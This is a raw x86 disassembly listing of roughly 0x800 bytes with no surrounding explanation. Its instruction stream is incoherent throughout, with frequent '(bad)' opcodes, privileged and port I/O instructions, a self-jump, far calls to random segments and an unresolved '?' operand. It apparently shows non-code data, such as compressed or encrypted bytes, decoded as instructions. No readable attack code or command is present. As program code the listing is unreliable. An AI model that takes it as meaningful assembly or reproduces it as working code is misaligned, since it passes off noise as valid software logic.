  41fece:	mov    edi,0x5e0d24f8
  41fed3:	push   ds
  41fed4:	test   eax,0x9886db84
  41fed9:	jne    0x41fed9
  41fedb:	sbb    eax,0xf7ab2598
  41fee0:	push   esi
  41fee1:	inc    ecx
  41fee2:	test   DWORD PTR [eax],esi
  41fee4:	enter  0x89e,0x6b
  41fee8:	ins    BYTE PTR es:[edi],dx
  41fee9:	ds leave 
  41feeb:	cli    
  41feec:	sahf   
  41feed:	mov    ch,dh
  41feef:	in     eax,0x55
  41fef1:	stos   BYTE PTR es:[edi],al
  41fef2:	cmc    
  41fef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef4:	push   cs
  41fef5:	add    edx,DWORD PTR [edi]
  41fef7:	mov    ecx,0x8a1f380f
  41fefc:	nop
  41fefd:	(bad)  
  41fefe:	imul   eax,DWORD PTR [ecx+0x35905b03],0x37
  41ff05:	out    dx,al
  41ff06:	inc    ebp
  41ff07:	push   edi
  41ff08:	push   ebp
  41ff09:	mov    eax,0x4b7b2ca8
  41ff0e:	mov    esp,0xb2405e46
  41ff13:	fisttp WORD PTR [ebp-0x2b95279a]
  41ff19:	ds push esp
  41ff1b:	(bad)
  41ff1f:	cwde   
  41ff20:	sub    BYTE PTR [edx+0x2bc41143],cl
  41ff26:	pop    ebx
  41ff27:	mov    edx,0x32705410
  41ff2c:	push   0x890a8ac7
  41ff31:	ret    
  41ff32:	stos   DWORD PTR es:[edi],eax
  41ff33:	pop    es
  41ff34:	push   ss
  41ff35:	not    DWORD PTR [ebx]
  41ff37:	(bad)  
  41ff38:	in     eax,dx
  41ff39:	mov    bh,dh
  41ff3b:	push   es
  41ff3c:	scas   al,BYTE PTR es:[edi]
  41ff3d:	call   0xd29e:0x93ae8442
  41ff44:	clc    
  41ff45:	bound  ebx,QWORD PTR [edi]
  41ff47:	cmp    ebx,DWORD PTR [ebp+ebx*1+0x661cc700]
  41ff4e:	mov    eax,ds:0xe5b92828
  41ff53:	fwait
  41ff54:	repnz pop esi
  41ff56:	mov    WORD PTR ds:0xf14d9331,ss
  41ff5c:	(bad)  
  41ff5d:	pop    ecx
  41ff5e:	int3   
  41ff5f:	push   ds
  41ff60:	fcom   DWORD PTR [ecx+0x14]
  41ff63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff64:	and    eax,DWORD PTR [esi+0x29]
  41ff67:	jo     0x41ff00
  41ff69:	sti    
  41ff6a:	cwde   
  41ff6b:	sub    eax,0x8973ba88
  41ff70:	popf   
  41ff71:	sbb    ch,bh
  41ff73:	lods   al,BYTE PTR ds:[esi]
  41ff74:	jns    0x41ff62
  41ff76:	inc    esi
  41ff77:	and    bl,dh
  41ff79:	lods   eax,DWORD PTR ds:[esi]
  41ff7a:	iret   
  41ff7b:	sbb    BYTE PTR [eax],dl
  41ff7d:	lahf   
  41ff7e:	adc    BYTE PTR [edx+0x4d],dh
  41ff81:	ins    DWORD PTR es:[edi],dx
  41ff82:	lods   eax,DWORD PTR ds:[esi]
  41ff83:	icebp  
  41ff84:	clc    
  41ff85:	mov    dl,0xa8
  41ff87:	mov    ecx,0x819d686e
  41ff8c:	sub    al,0x79
  41ff8e:	js     0x41ffbf
  41ff90:	jb     0x41ff8f
  41ff92:	add    eax,0x984f5852
  41ff97:	fild   QWORD PTR [ebx+0x13]
  41ff9a:	or     al,0x6d
  41ff9c:	popa   
  41ff9d:	or     eax,0x38ad09d9
  41ffa2:	int    0x99
  41ffa4:	in     al,0x4c
  41ffa6:	push   esp
  41ffa7:	test   DWORD PTR [ecx],edi
  41ffa9:	mov    esi,edx
  41ffab:	xchg   DWORD PTR [eax+0x13],edx
  41ffae:	or     eax,DWORD PTR [esi+0x38b0d7f]
  41ffb4:	aad    0xa3
  41ffb6:	pop    ebx
  41ffb7:	je     0x41ff99
  41ffb9:	xchg   ebx,eax
  41ffba:	add    DWORD PTR [edx],ebp
  41ffbc:	outs   dx,BYTE PTR ds:[esi]
  41ffbd:	push   ds
  41ffbe:	scas   al,BYTE PTR es:[edi]
  41ffbf:	loopne 0x41ffdd
  41ffc1:	and    eax,0xb4eccbd3
  41ffc6:	icebp  
  41ffc7:	mov    ds:0x937eace6,eax
  41ffcc:	in     al,dx
  41ffcd:	mov    esp,0x1a677232
  41ffd2:	leave  
  41ffd3:	imul   edi,ebx,0x510baedd
  41ffd9:	adc    esi,DWORD PTR [ebx-0x3f]
  41ffdc:	repz out dx,eax
  41ffde:	add    BYTE PTR [edx],al
  41ffe0:	mov    edi,0x4e1b820d
  41ffe5:	test   DWORD PTR [eax-0x30],edx
  41ffe8:	fidivr WORD PTR [edi+0x41]
  41ffeb:	out    dx,al
  41ffec:	ret    0xa98d
  41ffef:	mov    eax,0x98a9026e
  41fff4:	lods   eax,DWORD PTR ds:[esi]
  41fff5:	stos   BYTE PTR es:[edi],al
  41fff6:	push   eax
  41fff7:	cmp    esi,DWORD PTR [ebp-0x577a6872]
  41fffd:	mov    ecx,0x93aa2257
  420002:	outs   dx,DWORD PTR ds:[esi]
  420003:	cwde   
  420004:	ficomp WORD PTR [esi+0xd]
  420007:	pushf  
  420008:	jnp    0x41ffed
  42000a:	xchg   ebp,eax
  42000b:	inc    esp
  42000c:	int    0xd1
  42000e:	adc    BYTE PTR [ebp-0x2b],0x4d
  420012:	vfmaddss xmm0,xmm6,xmm7,DWORD PTR [edi-0x77190c96]
  42001c:	sahf   
  42001d:	ins    DWORD PTR es:[edi],dx
  42001e:	fcomp  DWORD PTR ds:0xfe98ecc4
  420024:	jnp    0x420043
  420026:	shl    BYTE PTR [ecx-0x2],1
  420029:	mov    ecx,0x5a933e1a
  42002e:	es out dx,al
  420030:	or     dl,bh
  420032:	inc    edx
  420033:	test   DWORD PTR cs:[ecx+0x308644fc],eax
  42003a:	cmp    BYTE PTR [edx-0x232f067b],ch
  420040:	pandn  mm6,mm4
  420043:	dec    ebx
  420044:	data16 mov BYTE PTR [edx],al
  420047:	push   ebp
  420048:	mov    dl,0x2b
  42004a:	fadd   QWORD PTR [edx]
  42004c:	fild   DWORD PTR [edx+0x2a2b0233]
  420052:	(bad)  
  420053:	fadd   QWORD PTR [edx]
  420055:	push   ebx
  420056:	xor    bh,BYTE PTR [ebx]
  420058:	into   
  420059:	adc    bl,cl
  42005b:	mov    esi,0x405eefe9
  420060:	push   ebx
  420061:	dec    edx
  420062:	adc    BYTE PTR [ecx+edx*4+0x27070000],bl
  420069:	or     bh,BYTE PTR [edi]
  42006b:	cs cwde 
  42006d:	jg     0x420084
  42006f:	pop    esi
  420070:	push   eax
  420071:	cld    
  420072:	outs   dx,BYTE PTR ds:[esi]
  420073:	adc    cl,BYTE PTR [edx+eax*2]
  420076:	fild   QWORD PTR [ecx+0x13]
  420079:	sub    dl,BYTE PTR [edx+0x72]
  42007c:	jg     0x4200a1
  42007e:	mov    edx,0x3adb9d85
  420083:	push   ecx
  420084:	xor    edi,DWORD PTR [edx+0x658391a8]
  42008a:	addr16 dec ebx
  42008c:	mov    edi,DWORD PTR [esp+eax*8-0x45a8918b]
  420093:	cld    
  420094:	jg     0x4200a7
  420096:	scas   eax,DWORD PTR es:[edi]
  420097:	lods   eax,DWORD PTR ds:[esi]
  420098:	and    ebp,DWORD PTR [esi-0x10]
  42009b:	mov    al,ds:0xffa751f8
  4200a0:	das    
  4200a1:	xchg   ebx,eax
  4200a2:	xor    eax,0xc19446c9
  4200a7:	sub    cl,cl
  4200a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200aa:	les    ebp,FWORD PTR [edx+0x55c74b42]
  4200b0:	add    eax,0x428ae529
  4200b5:	mov    edx,0x7b8c3edd
  4200ba:	dec    ebp
  4200bb:	xchg   ebp,eax
  4200bc:	int    0xa
  4200be:	pop    eax
  4200bf:	fwait
  4200c0:	mov    esp,0x84216d78
  4200c5:	push   es
  4200c6:	int    0x86
  4200c8:	mov    edx,0x1bd810b8
  4200cd:	bound  ebp,QWORD PTR [esi]
  4200cf:	jg     0x4200ef
  4200d1:	jo     0x42013a
  4200d3:	add    ah,ch
  4200d5:	mov    edx,0xa29706dd
  4200da:	sbb    esp,DWORD PTR [ecx]
  4200dc:	retf   0x19ad
  4200df:	pop    esp
  4200e0:	cmp    BYTE PTR [eax],dl
  4200e2:	xchg   ebx,eax
  4200e3:	xchg   BYTE PTR [esi+0x1300d068],ah
  4200e9:	outs   dx,BYTE PTR ds:[esi]
  4200ea:	dec    esi
  4200eb:	fisub  DWORD PTR [ebp+0x6c]
  4200ee:	das    
  4200ef:	cmp    eax,0xf746eaae
  4200f5:	adc    al,0x61
  4200f7:	mov    bh,0xc2
  4200f9:	int    0xd8
  4200fb:	lods   al,BYTE PTR ds:[esi]
  4200fc:	cmc    
  4200fd:	lods   al,BYTE PTR ds:[esi]
  4200fe:	icebp  
  4200ff:	mov    dh,0xd1
  420101:	jnp    0x420148
  420103:	gs sub al,0xf
  420106:	icebp  
  420107:	nop
  420108:	or     ah,BYTE PTR [edi-0x256526e8]
  42010e:	call   0xf8a9:0x7205f4ec
  420115:	popa   
  420116:	out    dx,al
  420117:	xchg   esp,eax
  420118:	dec    edx
  420119:	xchg   ecx,eax
  42011a:	dec    esi
  42011b:	loope  0x4200ca
  42011d:	adc    ebx,DWORD PTR [ecx-0x1a7c9267]
  420123:	into   
  420124:	push   0xfffffff8
  420126:	pop    edi
  420127:	mov    dl,0xae
  420129:	dec    eax
  42012a:	mov    cl,ah
  42012c:	mov    ds:0x7fd4687c,al
  420131:	out    dx,al
  420132:	pop    edi
  420133:	fcomp  QWORD PTR [eax]
  420135:	imul   esp,DWORD PTR [edx],0x4c2f2807
  42013b:	xchg   ebx,eax
  42013c:	hlt    
  42013d:	fist   DWORD PTR [edx]
  42013f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420140:	and    esi,esi
  420142:	pushf  
  420143:	sub    eax,0xb9fda72f
  420148:	add    dh,BYTE PTR ds:0x57b1b064
  42014e:	inc    esp
  42014f:	mov    eax,ds:0xe9eac6f
  420154:	pop    eax
  420155:	sbb    BYTE PTR [edx],bl
  420157:	or     eax,0xe6860bfb
  42015c:	push   edi
  42015d:	xchg   ebx,eax
  42015e:	or     DWORD PTR [ecx-0x6c],0xde805e20
  420165:	push   cs
  420166:	call   0x4b3eb2b5
  42016b:	or     DWORD PTR [edx],0xffffffae
  42016e:	test   BYTE PTR [edi],al
  420170:	pop    ecx
  420171:	ror    BYTE PTR [ecx],cl
  420173:	push   cs
  420174:	xor    al,ch
  420176:	cmp    eax,0x70644d60
  42017b:	nop
  42017c:	or     DWORD PTR [eax+0x4f07df48],edx
	...
  42018a:	pop    ecx
  42018b:	push   edi
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx+0x53],esi
  420197:	dec    eax
  420198:	push   ebp
  420199:	add    al,dl
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	add    BYTE PTR [esi],0x0
  4201a1:	add    BYTE PTR [ecx],bh
  4201a3:	aaa    
  4201a4:	mov    esi,0x28ba5fb7
  4201a9:	inc    ecx
  4201aa:	fsubp  st(3),st
  4201ac:	leave  
  4201ad:	push   ebx
  4201ae:	iret   
  4201af:	cld    
  4201b0:	aam    0x8a
  4201b2:	test   al,0xc
  4201b4:	add    DWORD PTR [eax-0x44],ecx
  4201b7:	xor    eax,0xcc1cb477
  4201bc:	iret   
  4201bd:	(bad)
  4201c1:	outs   dx,BYTE PTR ds:[esi]
  4201c2:	pop    eax
  4201c3:	sbb    BYTE PTR [ebp-0x5babbc5],0xe4
  4201ca:	out    dx,eax
  4201cb:	sahf   
  4201cc:	inc    ecx
  4201cd:	cmp    BYTE PTR [ebx],bh
  4201cf:	push   0xffffffa8
  4201d1:	dec    ebx
  4201d2:	mov    ebp,0x76b7b700
  4201d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201d8:	arpl   WORD PTR [edi-0x31],dx
  4201db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201dc:	jo     0x420222
  4201de:	mov    ch,0x36
  4201e0:	stos   DWORD PTR es:[edi],eax
  4201e1:	inc    ebp
  4201e2:	add    DWORD PTR [edi],0x42ed896c
  4201e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201e9:	je     0x420182
  4201eb:	ja     0x420170
  4201ed:	or     eax,0x252ac68e
  4201f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201f3:	cmp    cl,al
  4201f5:	inc    edi
  4201f6:	(bad)  
  4201f7:	iret   
  4201f8:	imul   edx,DWORD PTR [ebx-0x7b06d042],0xdceaebb1
  420202:	jbe    0x4201d2
  420204:	leave  
  420205:	mov    bh,0xec
  420207:	and    esi,ebx
  420209:	push   0xffffffb2
  42020b:	rol    esp,1
  42020d:	aaa    
  42020e:	gs ret 0x60ad
  420212:	pushf  
  420213:	or     esi,esi
  420215:	fs sar ebx,1
  420218:	or     eax,0x81354494
  42021d:	dec    esi
  42021e:	out    dx,al
  42021f:	dec    esp
  420220:	hlt    
  420221:	retf   
  420222:	xor    esi,DWORD PTR [eax+0x6d1297e7]
  420228:	repz stc 
  42022a:	in     eax,0xa6
  42022c:	aad    0x77
  42022e:	mov    WORD PTR [ebx+0x30892a98],?
  420234:	pop    eax
  420235:	vpaddq xmm4,xmm4,XMMWORD PTR [edi]
  420239:	add    ah,bh
  42023b:	xchg   ecx,eax
  42023c:	int3   
  42023d:	jle    0x420245
  42023f:	lods   eax,DWORD PTR ds:[esi]
  420240:	sbb    al,0xda
  420242:	sub    BYTE PTR [ebx],al
  420244:	lahf   
  420245:	inc    ecx
  420246:	(bad)  
  420248:	fs std 
  42024a:	(bad)  
  42024b:	sbb    al,0xe5
  42024d:	das    
  42024e:	lea    ebp,[ebx]
  420250:	clc    
  420251:	xchg   ecx,eax
  420252:	jmp    0xeec0:0xaf8bb92f
  420259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42025a:	ja     0x42021f
  42025c:	ret    0x67d5
  42025f:	shl    DWORD PTR [ebp+eiz*2+0x6d],1
  420263:	daa    
  420264:	(bad)  
  420265:	xchg   ecx,eax
  420266:	push   esp
  420267:	(bad)  
  420269:	pusha  
  42026a:	jl     0x420248
  42026c:	cmc    
  42026d:	jae    0x4202e5
  42026f:	mov    cl,0x43
  420271:	push   0xfffffffc
  420273:	retf   0xed73
  420276:	ror    BYTE PTR [eax],1
  420278:	add    eax,0xd18c6d40
  42027d:	cwde   
  42027e:	sti    
  42027f:	test   eax,eax
  420281:	xor    edx,DWORD PTR [esi]
  420283:	add    BYTE PTR ds:0x7373b532,dl
  420289:	std    
  42028a:	in     al,dx
  42028b:	push   ebp
  42028c:	mov    WORD PTR [edi],ss
  42028e:	aaa    
  42028f:	xor    DWORD PTR [ecx+ebx*2],esp
  420292:	add    ebp,eax
  420294:	call   0xfeb2253a
  420299:	out    0xd6,eax
  42029b:	xchg   esp,eax
  42029c:	xor    al,0xe8
  42029e:	pop    esp
  42029f:	jb     0x42028e
  4202a1:	je     0x420240
  4202a3:	fisub  WORD PTR [eax]
  4202a5:	xchg   ebp,eax
  4202a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202a7:	ret    
  4202a8:	aam    0xbb
  4202aa:	ja     0x420268
  4202ac:	mov    ah,0x29
  4202ae:	cli    
  4202af:	nop
  4202b0:	push   edi
  4202b1:	ja     0x420323
  4202b3:	xchg   DWORD PTR [esp+edi*4-0x54777215],eax
  4202ba:	mov    al,ds:0x9b42fd13
  4202bf:	jmp    0xcefb:0x2ca4b891
  4202c6:	jp     0x4202dc
  4202c8:	loop   0x420272
  4202ca:	idiv   BYTE PTR [ebx+ecx*2+0x5]
  4202ce:	mov    ah,0xfb
  4202d0:	enter  0xf5c8,0xdc
  4202d4:	aas    
  4202d5:	and    cl,BYTE PTR [edi+eax*8+0x60]
  4202d9:	ins    DWORD PTR es:[edi],dx
  4202da:	cmp    BYTE PTR [ecx-0x5d],ah
  4202dd:	cmp    dl,BYTE PTR [ebp+0x7]
  4202e0:	shl    DWORD PTR [ecx+0x0],cl
  4202e3:	in     al,dx
  4202e4:	retf   
  4202e5:	pop    ecx
  4202e6:	jae    0x420323
  4202e8:	add    eax,0x372c13da
  4202ed:	stos   BYTE PTR es:[edi],al
  4202ee:	mov    ecx,DWORD PTR ds:0x6ee5d943
  4202f4:	jecxz  0x420325
  4202f6:	call   0xf86127e2
  4202fb:	not    DWORD PTR [ecx+edi*4-0x49]
  4202ff:	xchg   ecx,eax
  420300:	xlat   BYTE PTR ds:[ebx]
  420301:	mov    ch,0x11
  420303:	dec    edi
  420304:	test   eax,0x20fee19a
  420309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42030a:	push   edx
  42030b:	arpl   WORD PTR [edx],si
  42030d:	je     0x420365
  42030f:	mov    ds:0xb28132e1,al
  420314:	mov    ebx,0x2485f0e2
  420319:	dec    eax
  42031a:	stc    
  42031b:	jae    0x42035b
  42031d:	in     eax,0xea
  42031f:	sub    BYTE PTR [edi-0x3a],0xc2
  420323:	mov    BYTE PTR [eax],al
  420325:	dec    edx
  420326:	mov    cl,0x6f
  420328:	out    dx,al
  420329:	pop    esi
  42032a:	sti    
  42032b:	xor    al,0xa4
  42032d:	pop    eax
  42032e:	test   ebx,ebx
  420330:	imul   eax,DWORD PTR [ebp+ebp*8-0x3c968b2a],0xffffff9c
  420338:	das    
  420339:	imul   edi,eax,0xfffffffc
  42033c:	mov    ebx,0x67423306
  420341:	dec    edx
  420342:	das    
  420343:	jae    0x420379
  420345:	pusha  
  420346:	pop    ecx
  420347:	fisttp DWORD PTR [eax-0x3daf2bdb]
  42034d:	dec    edx
  42034e:	into   
  42034f:	adc    eax,esp
  420351:	dec    edi
  420352:	jg     0x4203d3
  420354:	stos   DWORD PTR es:[edi],eax
  420355:	shl    DWORD PTR [eax],1
  420357:	pop    ss
  420358:	fsubr  DWORD PTR [edi-0x48]
  42035b:	sbb    bh,BYTE PTR [edi+edi*8+0x79440f28]
  420362:	jge    0x42035e
  420364:	test   eax,0xe8bd5982
  420369:	les    edi,FWORD PTR [ebp-0x4250541b]
  42036f:	and    eax,0xec46b327
  420374:	sbb    DWORD PTR [ebx],0xfffffff7
  420377:	xchg   esp,eax
  420378:	aaa    
  420379:	push   esi
  42037a:	lahf   
  42037b:	dec    edx
  42037c:	and    al,BYTE PTR [esi+0x33]
  42037f:	(bad)  
  420381:	ftst   
  420383:	or     dl,BYTE PTR [ebx-0x6b894eb9]
  420389:	mov    ebx,0x966f797b
  42038e:	dec    ebx
  42038f:	and    eax,0x83096c57
  420394:	inc    esi
  420395:	mov    al,0xff
  420397:	adc    dl,BYTE PTR ss:[ebx*8+0x1c89375d]
  42039f:	sbb    BYTE PTR [ebx+ebx*8-0x6e],0x17
  4203a4:	xor    DWORD PTR [ebx],ebp
  4203a6:	loopne 0x4203c6
  4203a8:	fsub   QWORD PTR [edx-0x5c]
  4203ab:	ss xchg ebp,eax
  4203ad:	add    al,0xe7
  4203af:	test   eax,0xd9b79dcd
  4203b4:	mov    ecx,0x55feeb4c
  4203b9:	adc    BYTE PTR [eax+0x24],0x3f
  4203bd:	retf   
  4203be:	retf   0x265f
  4203c1:	jne    0x420350
  4203c3:	add    eax,0x16e42658
  4203c8:	shl    DWORD PTR [esi-0x502bbfa9],0xf3
  4203cf:	arpl   cx,cx
  4203d1:	mov    bl,0xcf
  4203d3:	cdq    
  4203d4:	mov    ecx,0xebbaf498
  4203d9:	pusha  
  4203da:	jg     0x4203b3
  4203dc:	sbb    al,0x9
  4203de:	mov    esi,DWORD PTR [edx-0x14187b1]
  4203e4:	adc    dl,BYTE PTR [eax-0x65b20c19]
  4203ea:	repz int 0xd2
  4203ed:	and    al,0x2d
  4203ef:	aam    0xb3
  4203f1:	inc    esi
  4203f2:	mov    eax,0xaa0c70b3
  4203f7:	(bad)  [edi+edx*1-0x2964532f]
  4203fe:	jle    0x4203d9
  420400:	inc    ebp
  420401:	mov    ch,0xed
  420403:	retf   0xd05f
  420406:	sub    eax,0x4c3ace8f
  42040b:	ror    DWORD PTR [ecx],cl
  42040d:	test   DWORD PTR [ebx],ecx
  42040f:	test   eax,0x552d056c
  420414:	and    ch,BYTE PTR [ecx]
  420416:	sbb    al,0x8
  420418:	mov    bh,0xbc
  42041a:	sahf   
  42041b:	sub    edx,DWORD PTR [edi-0x1d4b173c]
  420421:	imul   esi,DWORD PTR [edi-0x4b29d1d8],0x65
  420428:	les    ebx,FWORD PTR [eax]
  42042a:	adc    edx,DWORD PTR [ecx-0x72]
  42042d:	add    cl,BYTE PTR [ebp+0x68]
  420430:	leave  
  420431:	mov    bl,0x18
  420433:	imul   esp,ecx,0x8ef2714c
  420439:	sub    BYTE PTR [ecx],dl
  42043b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42043c:	jge    0x4203be
  42043e:	jae    0x4203c7
  420440:	out    dx,al
  420441:	mov    ebp,ebx
  420443:	int    0x1e
  420445:	aad    0xfb
  420447:	imul   esi,DWORD PTR ds:0x30d0277c,0x3807a6cb
  420451:	mov    ah,0x19
  420453:	mov    bl,0xe8
  420455:	push   0x90612356
  42045a:	(bad)  
  42045b:	xor    edi,DWORD PTR [ecx-0x15c16bc9]
  420461:	lods   eax,DWORD PTR ds:[esi]
  420462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420463:	or     BYTE PTR [eax],cl
  420465:	aaa    
  420466:	out    dx,eax
  420467:	in     eax,dx
  420468:	inc    ebx
  420469:	push   ds
  42046a:	sbb    BYTE PTR [ecx+ecx*4-0xa],0x18
  42046f:	stc    
  420470:	not    DWORD PTR ds:0x62d17fdb
  420476:	xor    edi,DWORD PTR [ebx-0x3a915fe5]
  42047c:	cmp    al,0x91
  42047e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047f:	add    BYTE PTR [edx],dl
  420481:	das    
  420482:	mov    ecx,0x740a135
  420487:	(bad)  
  420488:	ja     0x4204d4
  42048a:	test   eax,0x25e8331b
  42048f:	push   es
  420490:	mov    esi,0x7a141cdb
  420495:	xchg   edi,eax
  420496:	test   edx,ebx
  420498:	ret    0x7f7f
  42049b:	and    eax,DWORD PTR [esi-0x7223dd80]
  4204a1:	and    ch,0x81
  4204a4:	or     ebp,DWORD PTR [edi]
  4204a6:	(bad)  
  4204a7:	adc    bh,al
  4204a9:	jne    0x4204c4
  4204ab:	test   al,0x83
  4204ad:	push   es
  4204ae:	adc    ah,cl
  4204b0:	adc    ebx,DWORD PTR [esi]
  4204b2:	cmp    eax,DWORD PTR [eax]
  4204b4:	sbb    al,0x4e
  4204b6:	add    esi,ebx
  4204b8:	and    al,0x74
  4204ba:	sbb    eax,0x6c643f88
  4204bf:	out    dx,al
  4204c0:	loopne 0x42051d
  4204c2:	sub    eax,0x5c1e6884
  4204c7:	dec    edi
  4204c8:	fadd   QWORD PTR [ebx]
  4204ca:	fcom   QWORD PTR [ebp+0x3a]
  4204cd:	jge    0x42051b
  4204cf:	lahf   
  4204d0:	ins    BYTE PTR es:[edi],dx
  4204d1:	push   ebp
  4204d2:	nop
  4204d3:	imul   eax,DWORD PTR [ecx],0xffffffde
  4204d6:	sbb    BYTE PTR [ebx+eiz*8+0x31a46928],bh
  4204dd:	or     bh,BYTE PTR [ebx+0x6d19a6ff]
  4204e3:	cdq    
  4204e4:	dec    cx
  4204e6:	iret   
  4204e7:	and    al,0x4a
  4204e9:	xchg   al,ah
  4204eb:	outs   dx,BYTE PTR ds:[esi]
  4204ec:	dec    ebp
  4204ed:	inc    ebp
  4204ee:	add    BYTE PTR [esi+ecx*8-0xf896336],bh
  4204f5:	es dec ebp
  4204f7:	pop    edi
  4204f8:	into   
  4204f9:	and    al,0x15
  4204fb:	mov    WORD PTR [edi],fs
  4204fd:	inc    eax
  4204fe:	addps  xmm3,XMMWORD PTR [ecx+0xf23dc05]
  420505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420506:	iret   
  420507:	adc    cl,dh
  420509:	call   0xdd55:0x7969584e
  420510:	jmp    0x4204ca
  420512:	out    dx,eax
  420513:	aad    0x90
  420515:	popf   
  420516:	pop    edi
  420517:	and    ecx,edx
  420519:	mov    edi,0xd6d81379
  42051e:	lea    ebx,[edx+0x5622df1f]
  420524:	pop    es
  420525:	inc    esi
  420526:	aas    
  420527:	ja     0x420531
  420529:	and    eax,DWORD PTR [ecx-0x34]
  42052c:	fnstsw WORD PTR cs:[esi]
  42052f:	hlt    
  420530:	gs call 0xce7ea34d
  420536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420537:	lods   al,BYTE PTR ds:[esi]
  420538:	icebp  
  420539:	das    
  42053a:	adc    al,0x57
  42053c:	push   esp
  42053d:	mov    esp,0x76fca239
  420542:	sar    DWORD PTR ss:[esi-0x1f],cl
  420546:	pop    ds
  420547:	pop    edi
  420548:	dec    esp
  420549:	mov    ecx,0xada4c51c
  42054e:	sbb    esp,0xffffffcd
  420551:	jb     0x42053d
  420553:	out    0xea,al
  420555:	mov    dl,0xfd
  420557:	push   0xffffffde
  420559:	mov    esp,0xbadb4e4b
  42055e:	mov    ah,0x4e
  420560:	xchg   edi,eax
  420561:	sahf   
  420562:	sbb    DWORD PTR [eax],esp
  420564:	icebp  
  420565:	es popf 
  420567:	retf   
  420568:	jle    0x4205cd
  42056a:	sub    esi,DWORD PTR [ecx]
  42056c:	adc    BYTE PTR [edx-0x24],dh
  42056f:	shr    cl,1
  420571:	mov    edi,0x2f2016ce
  420576:	jae    0x42055f
  420578:	sti    
  420579:	cmp    BYTE PTR [eax+0x25d8da0],ch
  42057f:	outs   dx,BYTE PTR ds:[esi]
  420580:	adc    eax,0xc1b20b5b
  420585:	mov    BYTE PTR [ecx+eiz*2],cl
  420588:	fwait
  420589:	rcl    DWORD PTR [eax-0x1],cl
  42058c:	or     ebx,ebp
  42058e:	pop    edi
  42058f:	cmp    esi,esp
  420591:	lods   al,BYTE PTR ds:[esi]
  420592:	mov    ds:0xe190d993,eax
  420597:	fld    TBYTE PTR [eax+ebp*1+0x1c]
  42059b:	xor    edx,DWORD PTR [eax]
  42059d:	pop    ss
  42059e:	hlt    
  42059f:	mov    WORD PTR [eax],ds
  4205a1:	jge    0x42057f
  4205a3:	icebp  
  4205a4:	inc    ebx
  4205a5:	dec    esp
  4205a6:	mov    edi,0xe039471a
  4205ab:	mov    cl,0xcd
  4205ad:	outs   dx,DWORD PTR ds:[esi]
  4205ae:	hlt    
  4205af:	adc    esi,ebp
  4205b1:	adc    bl,BYTE PTR [edi]
  4205b3:	jb     0x42058c
  4205b5:	mov    bl,0xf0
  4205b7:	mov    dl,0x22
  4205b9:	pop    esp
  4205ba:	mov    ebx,0xd22529cd
  4205bf:	inc    ebx
  4205c0:	retf   0xf6ef
  4205c3:	and    ebx,DWORD PTR [ebp-0x5d]
  4205c6:	int3   
  4205c7:	sub    dl,BYTE PTR [edi+0x3bcdf107]
  4205cd:	in     eax,0xa
  4205cf:	lods   eax,DWORD PTR ds:[esi]
  4205d0:	pop    eax
  4205d1:	xchg   esp,eax
  4205d2:	push   ecx
  4205d3:	mov    ecx,0xb62268d5
  4205d8:	add    eax,0x38beee54
  4205dd:	push   eax
  4205de:	arpl   cx,bp
  4205e0:	in     eax,dx
  4205e1:	inc    ebp
  4205e2:	xchg   ebp,eax
  4205e3:	fisttp DWORD PTR [edi+edx*1]
  4205e6:	pop    edx
  4205e7:	repnz sbb edi,edi
  4205ea:	mov    esp,0x781a5e63
  4205ef:	mov    ?,edi
  4205f1:	pop    eax
  4205f2:	cwde   
  4205f3:	inc    ebx
  4205f4:	dec    esi
  4205f5:	push   ds
  4205f6:	inc    ecx
  4205f7:	adc    al,0xc8
  4205f9:	or     al,0x6f
  4205fb:	fs inc ebx
  4205fd:	lods   al,BYTE PTR ds:[esi]
  4205fe:	cli    
  4205ff:	scas   eax,DWORD PTR es:[edi]
  420600:	sub    BYTE PTR [ecx+0x37],cl
  420603:	rcl    BYTE PTR [ecx+0x3c],cl
  420606:	std    
  420607:	(bad)  
  420608:	or     eax,0xb3937e9d
  42060d:	jp     0x4205d7
  42060f:	sahf   
  420610:	xchg   dh,dh
  420612:	xchg   ecx,eax
  420613:	cmp    BYTE PTR [eax+0x265ee57],cl
  420619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42061a:	mov    ds:0x6cb6c753,al
  42061f:	rol    ebp,cl
  420621:	xor    DWORD PTR [edx+0x61],esp
  420624:	sbb    DWORD PTR [ebp-0x4c227275],0xdec8c707
  42062e:	out    dx,al
  42062f:	test   dh,cl
  420631:	mov    eax,DWORD PTR [eax]
  420633:	mov    dl,0xd
  420635:	or     bh,cl
  420637:	xchg   DWORD PTR [eax+0x65],edx
  42063a:	jmp    0x8a4cef47
  42063f:	fsub   QWORD PTR [edx]
  420641:	inc    edx
  420642:	sbb    BYTE PTR [edi],ah
  420644:	push   ecx
  420645:	sahf   
  420646:	pop    ebp
  420647:	jl     0x4205f3
  420649:	push   cs
  42064a:	cmp    ch,BYTE PTR [edi+edx*4]
  42064d:	ss inc eax
  42064f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420650:	test   al,0x5c
  420652:	cmp    BYTE PTR [edx-0x1a425a33],al
  420658:	ss mov cl,dl
  42065b:	fucomp st(5)
  42065d:	inc    esi
  42065e:	pop    ds
  42065f:	dec    eax
  420660:	(bad)  
  420661:	mov    ch,0xc0
  420663:	push   esp
